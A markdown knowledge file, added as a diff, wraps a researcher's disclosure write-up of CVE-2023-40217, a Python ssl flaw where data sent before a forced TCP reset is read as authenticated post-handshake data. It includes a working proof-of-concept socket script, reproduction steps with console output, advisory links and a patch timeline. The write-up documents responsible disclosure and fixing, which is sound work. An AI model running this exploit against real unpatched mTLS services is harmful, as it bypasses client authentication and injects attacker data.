@@ -1,0 +1,156 @@
+<!--
+LICENSE UPL
+Author: Mauro Risonho de Paula Assumpção
+Data Create: 2026-03-16
+Data Update: 2026-03-16
+-->
+
+---
+name: writeup-aapooksman
+description: CTF writeups and security challenges by aapooksman.
+---
+
+# Writeups by aapooksman
+
+Source repository: `/repos/aapooksman`
+
+## Repository Index
+
+- writeups/CVE-2023-40217/README.md
+
+## Writeup Content
+
+
+### File: writeups/CVE-2023-40217/README.md
+
+# Summary
+
+Python ssl library in Python before 3.8.18, 3.9.x before 3.9.18, 3.10.x before 3.10.13, and 3.11.x before 3.11.5 did not properly handle a case where the TCP connection was terminated before a TLS handshake was made. This caused the library to return a ssl.SSLSocket object with TCP data in its buffer. An application could then read this data from the SSLSocket as it would be post-handshake TLS encrypted data.
+
+An attacker could exploit this vulnerability by connecting to a TLS server, sending payload data to the socket and immediately force close the socket. The TLS server would then assume that the TLS handshake and any client authentication was done and read the attacker supplied data. The vulnerability affects mostly mTLS Python implementations.
+
+The vulnerability severity is CVSS is 8.6 HIGH (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N)
+
+The exploit can be triggered reliably by sending TCP data to a Python SSLSocket followed directly by a RST packet. This can be implemented with Python with the following code:
+
+```python
+import socket
+import struct
+
+# Connect to a server with TCP
+upstream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+upstream_socket.connect(('127.0.0.1', 12345))
+# Exploit part 1: set the socket to be killed immediately when closed
+upstream_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
+upstream_socket.setblocking(False)
+
+# Exploit part 2: Send malicious data instead of TLS handshake and immediately force close the connection
+data = b"exploit by aapo"
+upstream_socket.send(data)
+upstream_socket.close()
+```
+
+The ```socket.setsockopt()``` and ```socket.setblocking()``` options ensure that the socket is not closed gracefully but is forcibly terminated when ```socket.close()``` is called.
+
+# Reproduction
+
+ 1. Run a basic Python ssl server with a vulnerable Python version
+
+    ```console
+    $ python3 --version
+    Python 3.7.3
+    $ python3 python-ssl-server-victim.py
+    ```
+
+ 2. Connect to the server with a standard TLS client
+
+    ```console
+    $ openssl s_client -connect 127.0.0.1:12345
+    ```
+
+ 3. Observe that the server does not accept the connection as the client does not have a proper client certificate
+
+    ```console
+    $ python3 --version
+    Python 3.7.3
+    $ python3 python-ssl-server-victim.py
+    Traceback (most recent call last):
+    File "python-ssl-server-victim.py", line 18, in <module>
+      tls_socket = ctx.wrap_socket(conn, server_side=True)
+    File "/usr/lib/python3.7/ssl.py", line 412, in wrap_socket
+      session=session
+    File "/usr/lib/python3.7/ssl.py", line 853, in _create
+      self.do_handshake()
+    File "/usr/lib/python3.7/ssl.py", line 1117, in do_handshake
+      self._sslobj.do_handshake()
+    ssl.SSLError: [SSL: PEER_DID_NOT_RETURN_A_CERTIFICATE] peer did not return a certificate (_ssl.c:1056)
+    ```
+
+ 4. Restart the server and connect to it with the exploit POC
+
+    ```console
+    $ python3 python-ssl-client-exploit.py
+    ```
+
+ 5. Observe that the server prints out the attacker chosen payload
+
+    ```console
+    $ python3 --version
+    Python 3.7.3
+    $ python3 python-ssl-server-victim.py
+    b'exploit by aapo'
+    ```
+
+ 6. If the same server code is run with patched Python version, the exploit will not work
+
+    ```console
+    $ python3.13 --version
+    Python 3.13.0a0
+    $ python3.13 python-ssl-server-victim.py 
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.13/ssl.py", line 992, in _create
+        self.getpeername()
+    OSError: [Errno 107] Transport endpoint is not connected
+    
+    During handling of the above exception, another exception occurred:
+    
+    Traceback (most recent call last):
+      File "python-ssl-server-victim.py", line 18, in <module>
+        tls_socket = ctx.wrap_socket(conn, server_side=True)
+                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+      File "/usr/local/lib/python3.13/ssl.py", line 455, in wrap_socket
+        return self.sslsocket_class._create(
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+      File "/usr/local/lib/python3.13/ssl.py", line 1024, in _create
+        raise notconn_pre_handshake_data_error
+    ssl.SSLError: Closed before TLS handshake with data in recv buffer.
+    ```
+
+ 7. The vulnerability can be used also from the server side if the client reads data before sending any
+
+    ```console
+    $ python3 python-ssl-server-exploit.py
+    ```
+
+    ```console
+    $ python3 python-ssl-client-victim.py
+    b'exploit by aapo'
+    ```
+
+# Additional Materials
+
+ * Detailed advisory made together with the Python security team: [https://mail.python.org/archives/list/security-announce@python.org/thread/PEPLII27KYHLF4AK3ZQGKYNCRERG4YXY/](https://mail.python.org/archives/list/security-announce@python.org/thread/PEPLII27KYHLF4AK3ZQGKYNCRERG4YXY/)
+ * GitHub issue for the vulnerability [https://github.com/python/cpython/issues/108310](https://github.com/python/cpython/issues/108310)
+ * Seth Larson's detailed writeup from the Python Security Response Team perspective [https://sethmlarson.dev/security-developer-in-residence-weekly-report-8](https://sethmlarson.dev/security-developer-in-residence-weekly-report-8)
+
+# Timeline
+
+ * August 8,2023: Reported by Aapo Oksman to security@python.org.
+ * August 8, 2023: Acknowledged the report.
+ * August 9, 2023: Acknowledgement of the vulnerability, sent CVE ID request to MITRE.
+ * August 10, 2023: CVE-2023-40217 assigned by MITRE.
+ * August 15, 2023: Patch authored by Gregory P Smith, reviewed by Thomas Wouters.
+ * August 22, 2023: Patch applied to feature and security branches by Łukasz Langa.
+ * August 24, 2023: Python 3.11.5, 3.10.13, 3.9.18, 3.8.18 are published containing the fix for CVE-2023-40217.
+ * August 24, 2023: Advisory published.
+
